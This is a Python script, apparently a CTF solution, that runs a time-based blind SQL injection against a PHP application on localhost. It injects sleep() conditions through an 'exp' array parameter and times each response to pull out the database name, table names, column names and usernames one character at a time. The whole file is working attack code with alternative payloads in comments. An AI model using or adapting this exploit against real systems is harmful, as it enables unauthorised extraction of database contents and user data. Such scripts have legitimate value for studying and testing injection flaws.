# '''
# Author: m1saka@x1ct34m
# blog: www.m1saka.love
# '''
import requests
import time
flag = ''

for i in range(1,100):
    for j in r'{}0123456789abcdefghijklmnopqrstuvwxyz-_,':
        #开始计时
        before_time = time.time()
        #payload = 'substr((select database()),{},1)="{}"'.format(i,j)
        #payload = 'substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)="{}"'.format(i,j)
        payload = 'substr((select group_concat(column_name) from information_schema.columns where table_name="users"),{},1)="{}"'.format(i,j)
        #payload = 'substr((select group_concat(username) from users),{},1)="{}"'.format(i,j)
        url     = 'http://localhost:7777/public/index.php?username[0]=exp&username[1]=sleep(if((1^({})),0,3))&username[2]=1'.format(payload)
        #print(url)
        r = requests.get(url+ payload)
        #返回时间
        after_time = time.time()
        offset = after_time - before_time
        if offset > 2.8:
            flag += j
            print(flag)
            break